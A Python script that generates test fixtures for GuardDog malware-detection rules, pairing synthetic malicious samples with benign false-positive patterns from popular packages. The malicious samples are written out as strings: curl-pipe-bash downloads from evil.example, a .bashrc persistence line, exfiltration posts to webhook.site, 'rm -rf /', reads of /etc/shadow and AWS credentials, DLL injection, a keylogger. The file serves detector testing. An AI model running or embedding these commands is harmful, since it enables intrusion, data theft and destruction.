"""
Generates paired test fixtures for the GuardDog source-code threat-* rules that
were found to produce false positives when scanning the top 50 npm + PyPI packages.

For each rule we store:
  fixtures/<rule>/malicious.<ext>   - synthetic code that SHOULD match (true positive)
  fixtures/<rule>/benign.<ext>      - a real false-positive pattern that should NOT match

The malicious samples are not actually harmful; they only contain the textual
patterns the rule is meant to catch. The benign samples reproduce the exact FP
observed on a trusted package.

Run:  uv run python tests/rule_fp_review/generate_fixtures.py
Then: uv run python tests/rule_fp_review/validate.py
"""
import os

BASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")

# Each entry: rule_id -> (malicious_ext, malicious_src, benign_ext, benign_src)
FIXTURES = {}

# 1. threat-npm-http-dependency
FIXTURES["threat-npm-http-dependency"] = ("json", """{
  "name": "evil-package",
  "version": "1.0.0",
  "dependencies": {
    "internal-lib": "http://attacker.example/internal-lib",
    "real-dep": "^1.2.3"
  }
}
""", "json", """{
  "name": "legit-package",
  "version": "2.0.0",
  "author": { "name": "Jane Dev", "url": "http://janedev.example" },
  "homepage": "http://janedev.example/legit-package",
  "repository": { "type": "git", "url": "http://github.com/jane/legit-package.git" },
  "dependencies": {
    "express": "^4.18.0",
    "lodash": "^4.17.21"
  }
}
""")

# 2. threat-runtime-obfuscation  (condition: #b64_1 >= 5 here)
_b64 = ("QWxhZGRpbjpvcGVuIHNlc2FtZQ" * 5)[:104]
# Literal "\uXXXX" escape text (12 in a row) as it appears in a generated Unicode
# data table; each line is one $unicode_1 hit, two lines -> #unicode_1 >= 2.
_uni_run = "".join("\\u%04x" % c for c in range(0x0101, 0x0101 + 24, 2))
FIXTURES["threat-runtime-obfuscation"] = ("js", """// Heavily obfuscated dropper: five long base64 blobs decoded and eval'd
const _p = [
  "%s",
  "%s",
  "%s",
  "%s",
  "%s",
];
_p.forEach((b) => eval(Buffer.from(b, "base64").toString()));
""" % (_b64, _b64, _b64, _b64, _b64), "py", '''# FALSE POSITIVE: a Unicode category data table (pygments-style unistring.py).
# Two long runs of \\uXXXX escapes trip $unicode_1 (#unicode_1 >= 2), but this is
# declarative Unicode property data, not obfuscation.
Ll = "%s"
Lu = "%s"
''' % (_uni_run, _uni_run))

# 3. threat-runtime-obfuscation-unicode  (condition: 2 of them)
FIXTURES["threat-runtime-obfuscation-unicode"] = ("py", '''# Homoglyph attack: an ASCII-looking identifier/string secretly using Cyrillic
# letters (р = Cyrillic r, а = Cyrillic a) to impersonate "paypal".
TRUSTED_HOST = "раypal.com"
''', "py", '''# FALSE POSITIVE: a charset/i18n data table that legitimately lists the
# Cyrillic alphabet (charset-normalizer / iconv-lite style). Contains several
# Cyrillic homoglyph bytes, but it is reference data, not obfuscation.
CYRILLIC_LOWER = "абвгдежзиклмноп"
''')

# 4. threat-runtime-obfuscation-api  (condition: any of them)
FIXTURES["threat-runtime-obfuscation-api"] = ("py", '''# Reaching exec() dynamically via getattr to evade static detection.
getattr(__builtins__, "exec")("import os; os.system('id')")
''', "py", '''# FALSE POSITIVE: the canonical six.py Python 2/3 compatibility shim. `exec` is a
# keyword in Py2 so it must be fetched via getattr; this is legitimate compat code.
import moves
exec_ = getattr(moves.builtins, "exec")
''')

# 5. threat-process-sysinfo  (public rule: threat_process_spawn_sysinfo, via lolbas_sysinfo)
FIXTURES["threat-process-sysinfo"] = ("py", '''import subprocess
# Recon: shelling out to system-info LOLBAS tools.
subprocess.check_output(["whoami"])
subprocess.run("hostname", shell=True)
''', "py", '''# FALSE POSITIVE: 'hostname' here is an endpoint dictionary key (botocore-style),
# not the hostname command being spawned.
def resolve_endpoint(resolved):
    return resolved["hostname"]
''')

# 6. threat-process-download-exec
FIXTURES["threat-process-download-exec"] = ("js", '''const { exec } = require("child_process");
// Download-and-execute: pull a remote script and pipe it straight to a shell.
exec("curl http://evil.example/payload.sh | bash");
''', "js", '''// FALSE POSITIVE: a CLI that imports child_process (to spawn a local build) and
// uses fetch (to read a registry index). Neither downloads code that is executed.
const { spawn } = require("child_process");

export async function fetchVersions() {
  const res = await fetch("https://registry.example.com/versions.json");
  return res.json();
}

export function build(args) {
  return spawn("node", args);
}
''')

# 7. threat-process-cryptomining
FIXTURES["threat-process-cryptomining"] = ("py", '''# Cryptominer config.
MINER = "xmrig"
POOL = "stratum+tcp://pool.minexmr.com:4444"
''', "py", '''# FALSE POSITIVE: a base64-encoded image data URI (eslint HTML formatter style).
# The $monero_address regex coincidentally matches a 95-char base58-like run.
LOGO = "data:image/png;base64,iVBORw0KGgo4A%s"
''' % ("a" * 93))

# 8. threat-process-injection-dll
FIXTURES["threat-process-injection-dll"] = ("py", '''# Classic remote-thread DLL injection chain.
kernel32.WriteProcessMemory(handle, addr, payload, len(payload), 0)
kernel32.CreateRemoteThread(handle, None, 0, addr, 0, 0, 0)
''', "py", '''# FALSE POSITIVE: filelock uses kernel32 only to check whether the lock-holding
# process is still alive (OpenProcess + CloseHandle). No injection.
import ctypes
def pid_exists(pid):
    SYNCHRONIZE = 0x00100000
    h = ctypes.windll.kernel32.OpenProcess(SYNCHRONIZE, 0, pid)
    if h:
        ctypes.windll.kernel32.CloseHandle(h)
        return True
    return False
''')

# 9. threat-process-memory
FIXTURES["threat-process-memory"] = ("py", '''# Credential dumping from process memory.
target = "lsass.exe"
ReadProcessMemory(handle, base_address, buffer, size, None)
''', "py", '''# FALSE POSITIVE: filelock OpenProcess liveness check (SYNCHRONIZE access only),
# not memory scraping.
def pid_alive(pid):
    SYNCHRONIZE = 0x00100000
    handle = kernel32.OpenProcess(SYNCHRONIZE, 0, pid)
    return bool(handle)
''')

# 10. threat-runtime-keylogging
FIXTURES["threat-runtime-keylogging"] = ("py", '''from pynput import keyboard

def on_press(key):
    with open("keys.log", "a") as f:
        f.write(str(key))

keyboard.Listener(on_press=on_press).start()
''', "js", '''// FALSE POSITIVE: React reads its devtools global hook. The substring
// "GLOBAL_HOOK" trips $global_hook but has nothing to do with keylogging.
const hook = window.__REACT_DEVTOOLS_GLOBAL_HOOK__;
if (hook) {
  hook.inject(internals);
}
''')

# 11. threat-runtime-enumeration  (condition: 2 of them)
FIXTURES["threat-runtime-enumeration"] = ("py", '''import psutil
# Host enumeration: list every process and read the user database.
for proc in psutil.process_iter():
    print(proc.pid)
with open("/etc/passwd") as f:
    users = f.read()
''', "py", '''# FALSE POSITIVE: $nmap matches the "nMap" substring of ChainMap, and $py_ip_addr
# matches "IP Address" in the docstring. Neither is network enumeration.
from collections import ChainMap

def merge_configs(a, b):
    """Merge configs into a ChainMap. Also validates the IP Address fields."""
    return ChainMap(a, b)
''')

# 12. threat-runtime-dynamic-loader
FIXTURES["threat-runtime-dynamic-loader"] = ("py", '''import importlib
import urllib.request

def load_remote(name, url):
    payload = urllib.request.urlopen(url).read()
    exec(payload)
    return importlib.import_module(name)
''', "py", '''# FALSE POSITIVE: requests/compat.py style. urllib.request is only imported as a
# symbol (no urlopen call) and importlib loads a local optional dependency.
import importlib
from urllib.request import getproxies

def get_encoder():
    try:
        return importlib.import_module("chardet")
    except ImportError:
        return None

PROXIES = getproxies()
''')

# 13. threat-filesystem-read
FIXTURES["threat-filesystem-read"] = ("py", '''import os
# Stealing credentials from well-known sensitive files.
with open("/etc/shadow") as f:
    shadow = f.read()
creds = open(os.path.expanduser("~/.aws/credentials")).read()
''', "py", '''# FALSE POSITIVE: the requests library defines the standard netrc filenames as a
# constant. $netrc matches the bare ".netrc" substring; this is documented HTTP
# auth support, not credential theft.
NETRC_FILES = (".netrc", "_netrc")
''')

# 14. threat-filesystem-destruction
FIXTURES["threat-filesystem-destruction"] = ("py", '''import os
# Wipe the entire filesystem.
os.system("rm -rf /")
''', "py", '''# FALSE POSITIVE: a Pygments lexer keyword list (Qlik builtins). $drop_table
# matches the highlighter vocabulary string, which is never executed SQL.
KEYWORDS = ["Drop table", "Drop database", "Truncate table", "Load"]
''')

# 15. threat-filesystem-autostart
FIXTURES["threat-filesystem-autostart"] = ("py", '''import os
# Persistence: append a payload to the user's shell startup file.
with open(os.path.expanduser("~/.bashrc"), "a") as f:
    f.write("\\ncurl http://evil.example/x.sh | bash\\n")
''', "py", '''# FALSE POSITIVE: botocore AWS named-profile handling stores a config key whose
# name embeds the profile dotfile token, and open() appears elsewhere in the
# module, so the rule fired without any shell-startup persistence.
PROFILE_CONFIG_KEY = ".profile_config"

def load_profile(path):
    with open(path) as f:
        return f.read()
''')

# 16. threat-network-exfiltration  (public rule: threat_network_outbound)
FIXTURES["threat-network-exfiltration"] = ("py", '''import requests
# Exfiltrate collected data to a throwaway webhook endpoint.
requests.post("https://webhook.site/0000-dead-beef", json=stolen)
''', "py", '''# FALSE POSITIVE: legitimate URLs. A suspicious-TLD substring inside a longer
# domain (gap-system.org) and non-routable IPs (loopback, cloud metadata) are
# not exfiltration destinations.
HOMEPAGE = "https://www.gap-system.org/"
LOCAL_DEBUG = "http://127.0.0.1:8080/debug"
METADATA_URL = "http://169.254.169.254/latest/meta-data/"
''')

# 17. threat-network-outbound-shady-links
FIXTURES["threat-network-outbound-shady-links"] = ("py", '''import requests
# Pulling a second-stage binary from a known malware-hosting service.
requests.get("https://files.catbox.moe/evilbin.bin")
''', "py", '''# FALSE POSITIVE: a Cloudflare Workers coverage badge in the README/metadata.
# $ephemeral1 flags any *.workers.dev domain, but this is a legitimate asset.
README_BADGE = "https://coverage-badge.example.workers.dev/badge.svg"
''')

# 18. threat-network-exfil-sysinfo
FIXTURES["threat-network-exfil-sysinfo"] = ("py", '''import socket
import requests
# Collect the hostname and ship it out in an HTTP request.
host = socket.gethostname()
requests.post("https://evil.example/collect", json={"host": host})
''', "py", '''# FALSE POSITIVE: setuptools/jaraco style. platform.system() only picks an
# rmtree error handler; urllib.request.urlopen() downloads an unrelated tarball.
# The two never share data, but the rule correlates them anyway.
import platform
import urllib.request

def _on_rmtree_error(func, path, exc):
    if platform.system() == "Windows":
        os.chmod(path, 0o700)

def fetch_tarball(url, dest):
    with urllib.request.urlopen(url) as resp:
        dest.write(resp.read())
''')


# Extra benign samples for rules with more than one distinct FP vector.
# rule_id -> list of (filename, content)
EXTRA_BENIGN = {
    "threat-runtime-obfuscation": [(
        "benign_crypto_hex.py",
        '''# FALSE POSITIVE: elliptic-curve domain parameters (brainpool/NIST) are long
# 0x hex literals that the base64-length heuristic matched. They are math
# constants, not encoded payloads.
P = 0xAADD9DB8DBE9C48B3FD4E6AE33C9FC07CB308DB3B3C9D20ED6639CCA703308717D4D9B009BC66842AECDA12AE6A380E62881FF2F2D82C68528AA6056583A48F3
A = 0x7830A3318B603B89E2327145AC234CC594CBDD8D3DF91610A83441CAEA9863BC2DED5D5AA8253AA10A2EF1C98B9AC8B57F1117A72BF2C7B9E7C1AC4D77FC94CA
B = 0x3DF91610A83441CAEA9863BC2DED5D5AA8253AA10A2EF1C98B9AC8B57F1117A72BF2C7B9E7C1AC4D77FC94CADC083E67984050B75EBAE5DD2809BD638016F723
N = 0xAADD9DB8DBE9C48B3FD4E6AE33C9FC07CB308DB3B3C9D20ED6639CCA70330870553E5C414CA92619418661197FAC10471DB1D381085DDADDB58796829CA90069
GX = 0x81AEE4BDD82ED9645A21322E9C4C6A9385ED9F70B5D916C1B43B62EEF4D0098EFF3B1F78E2D0D48D50D1687B93B97D5F7C6D5047406A5E688B352209BCB9F822
''',
    )],
}


def main():
    for rule, (mext, msrc, bext, bsrc) in FIXTURES.items():
        d = os.path.join(BASE, rule)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, f"malicious.{mext}"), "w") as f:
            f.write(msrc)
        with open(os.path.join(d, f"benign.{bext}"), "w") as f:
            f.write(bsrc)
        for fname, content in EXTRA_BENIGN.get(rule, []):
            with open(os.path.join(d, fname), "w") as f:
                f.write(content)
    print(f"Generated fixtures for {len(FIXTURES)} rules under {BASE}")


if __name__ == "__main__":
    main()
